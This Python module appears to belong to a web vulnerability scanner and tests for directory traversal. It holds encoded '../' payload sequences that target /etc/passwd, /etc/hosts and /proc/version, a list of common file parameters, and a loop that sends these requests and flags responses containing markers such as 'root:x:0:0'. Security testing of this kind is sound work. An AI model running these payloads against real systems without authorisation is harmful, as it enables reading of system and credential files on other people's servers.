# modules/traversal_tester.py
import requests

TRAVERSAL_SEQUENCES = [
    "../",
    "..\\",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",
]

LINUX_TARGETS = [
    "etc/passwd",
    "etc/hosts",
    "etc/hostname",
    "proc/version",
]

LINUX_INDICATORS = {
    "etc/passwd":   "root:x:0:0",
    "etc/hosts":    "127.0.0.1",
    "etc/hostname": "",
    "proc/version": "linux version",
}

FILE_PARAMS = ["file", "page", "path", "template", "view", "doc", "document", "load"]


def test_traversal(url, params=None, session=None):
    """
    Tests for directory traversal vulnerabilities.
    Pass a requests.Session object if the target requires authentication.
    """
    print(f"\n[*] Testing for directory traversal on {url}...")

    client = session if session else requests

    findings = []

    if not params:
        params = {p: "index.html" for p in FILE_PARAMS}

    for param_name in params:
        for target_file in LINUX_TARGETS:
            for sequence in TRAVERSAL_SEQUENCES:
                payload = (sequence * 6) + target_file

                test_params = params.copy()
                test_params[param_name] = payload

                try:
                    response = client.get(url, params=test_params, timeout=5)
                    body = response.text.lower()

                    indicator = LINUX_INDICATORS.get(target_file, "")

                    if indicator and indicator in body:
                        finding = {
                            "type": "Directory Traversal",
                            "parameter": param_name,
                            "payload": payload,
                            "target_file": target_file,
                            "evidence": f"Content of {target_file} found in response",
                            "url": response.url
                        }
                        findings.append(finding)
                        print(f"[!] POSSIBLE TRAVERSAL — param={param_name}")
                        print(f"    Read {target_file} via {sequence} encoding")
                        break

                except requests.RequestException:
                    pass

    if not findings:
        print(f"[-] No traversal indicators found")

    return findings